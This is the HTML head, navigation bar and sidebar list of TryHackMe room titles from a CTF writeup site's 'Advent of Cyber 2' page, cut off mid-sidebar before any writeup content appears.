<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-writeups docs-doc-id-Tryhackme/Advent of Cyber 2/Advent of Cyber 2">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">Advent of Cyber 2 | CyFun</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" name="twitter:image" content="https://s4ch.github.io/img/cydesk.png"><meta data-rh="true" property="og:url" content="https://s4ch.github.io/writeups/Tryhackme/Advent of Cyber 2/"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="robots" content="max-image-preview:large"><meta data-rh="true" name="monetization" content="$ilp.uphold.com/fYPB8Pjyig3z"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-writeups-current"><meta data-rh="true" property="og:title" content="Advent of Cyber 2 | CyFun"><meta data-rh="true" name="description" content="Event Homepage//tryhackme.com/christmas"><meta data-rh="true" property="og:description" content="Event Homepage//tryhackme.com/christmas"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://s4ch.github.io/writeups/Tryhackme/Advent of Cyber 2/"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/Tryhackme/Advent of Cyber 2/" hreflang="en"><link data-rh="true" rel="alternate" href="https://s4ch.github.io/writeups/Tryhackme/Advent of Cyber 2/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="CyFun RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="CyFun Atom Feed">
<link rel="alternate" type="application/json" href="/blog/feed.json" title="CyFun JSON Feed">



<link rel="icon" href="/img/cy.png">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="rgb(37, 194, 160)">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="#000">
<link rel="apple-touch-icon" href="/img/cy.png">
<link rel="mask-icon" href="/img/cy.png" color="rgb(62, 204, 94)">
<meta name="msapplication-TileImage" content="/img/cy.png">
<meta name="msapplication-TileColor" content="#000"><link rel="stylesheet" href="/assets/css/styles.ff01972a.css">
<link rel="preload" href="/assets/js/runtime~main.3415e7ae.js" as="script">
<link rel="preload" href="/assets/js/main.c90fa39a.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"dark")}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/cy.png" alt="Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">CyFun</b></a><a class="navbar__item navbar__link" href="/blog/">Blog</a><a class="navbar__item navbar__link" href="/docs/">Threads</a><a class="navbar__item navbar__link" href="/ctf/">CTF</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/writeups/">Writeups</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/s4ch/s4ch.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently dark mode)" aria-label="Switch between dark and light mode (currently dark mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/writeups/">About</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/writeups/HackTheBox/Academy/write-up/">HackTheBox</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" aria-expanded="true" href="/writeups/Tryhackme/0day/">Tryhackme</a></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/0day/">0day</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Active Directory Basics/">Active Directory Basics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Advent of Cyber/">Advent of Cyber</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/writeups/Tryhackme/Advent of Cyber 2/">Advent of Cyber 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Adventure Time/">Adventure Time</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Agent Sudo/">Agent Sudo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Alfred/">Alfred</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anonforce/">Anonforce</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anonymous/">Anonymous</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anonymous Playground/">Anonymous Playground</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Anthem/">Anthem</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Aster/">Aster</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/AttackerKB/">AttackerKB</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Attacking ICS Plant 1/Attacking ICS Plant/">Attacking ICS Plant 1</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Attacking Kerberos/">Attacking Kerberos</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Attacktive Directory/">Attacktive Directory</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Authenticate/">Authenticate</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Avengers Blog/">Avengers Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Basic Malware RE/">Basic Malware RE</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/BasicPentesting/Basic Pentesting/">BasicPentesting</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Binex/">Binex</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Biohazard/">Biohazard</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Blog/">Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Blue/">Blue</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Blueprint/">Blueprint</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Boiler CTF/">Boiler CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Bolt/">Bolt</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Borderlands/">Borderlands</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Bounty Hacker/">Bounty Hacker</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Brainstorm/">Brainstorm</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Break Out The Cage/">Break Out The Cage</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Break it/">Break it</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Brooklyn Nine Nine/Brookyln nine nine/">Brooklyn Nine Nine</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Brute It/">Brute It</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Buffer Overflow Prep/">Buffer Overflow Prep</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Burp Suite/Burpsuite/">Burp Suite</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/C4ptur3-th3-fl4g/c4ptur3 th3 fl4g/">C4ptur3-th3-fl4g</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/CC Steganography/">CC: Steganography</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/CMesS/">CMesS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/CTF collection Vol.1/">CTF collection Vol.1</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Carpe Diem 1/Carpe Deim 1/">Carpe Diem 1</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/CherryBlossom/Cherry Blossom/">CherryBlossom</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Cicada-3301 Vol.1/Cicada 3301 Vol.1/">Cicada-3301 Vol.1</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Common Linux Privesc/">Common Linux Privesc</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/ConvertMyVideo/">ConvertMyVideo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Crack the hash/">Crack the hash</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Cross-site Scripting/">Cross-site Scripting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Daily Bugle/">Daily Bugle</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Dav/">Dav</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Daves Blog/">Dave&#x27;s Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Develpy/">Develpy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Dogcat/">dogcat</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Easy Peasy/">Easy Peasy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Empire/">Empire</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Encryption - Crypto 101/">Encryption - Crypto 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Erit Securus I/">Erit Securus I</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/For Business Reasons/">For Business Reasons</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Forensics/">Forensics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Game Zone/">Game Zone</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/GamingServer/">GamingServer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Gatekeeper/">Gatekeeper</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Geolocating Images/Geolocating/">Geolocating Images</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Getting Started/">Getting Started</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ghizer/">Ghizer</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Git Happens/">Git Happens</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Google Dorking/">Google Dorking</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Gotta Catchem All/Gotta Catch em All/">Gotta Catchem All</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/GraphQL/">GraphQL</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HA Joker CTF/">HA Joker CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HackerNote/">hackerNote</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Hacking with Powershell/">Hacking with Powershell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Harder/">harder</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Hashing - Crypto 101/">Hashing - Crypto 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HaskHell/">HaskHell</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Hc0n Christmas CTF/hcon christmas ctf/">Hc0n Christmas CTF</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/HeartBleed/">HeartBleed</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/History of Malware/">History of Malware</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Hydra/">Hydra Introduction</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ice/">ICE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ignite/">Ignite</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Inclusion/">Inclusion</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Inoculation/">Inoculation</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Internal/">Internal</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Intro to Python/">Intro to Python</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Intro to x86-64/Intro to x86 and 64/">Intro to x86-64</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Introduction to Django/">Introduction to Django</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Introductory Networking/">Introductory Networking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Investigating Windows/">Investigating Windows</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Iron Corp/">Iron Corp</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jack/">Jack</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jack-of-All-Trades/">Jack-of-All-Trades</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jacob the Boss/">Jacob the Boss</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/JavaScript Basics/">JavaScript Basics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jeff/">Jeff</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jupyter 101/">Jupyter 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Jurassic Park/">Jurassic Park</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Kali Machine/">Kali Machine</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Kenobi/">Kenobi</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Kiba/">kiba</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/LFI/UFI/">LFI</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/LFI Basics/">LFI Basics</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/LazyAdmin/">LazyAdmin</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Lian_Yu/Lian Yu/">Lian_Yu</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Library/">Library</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Linux Challenges/">Linux Challenges</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 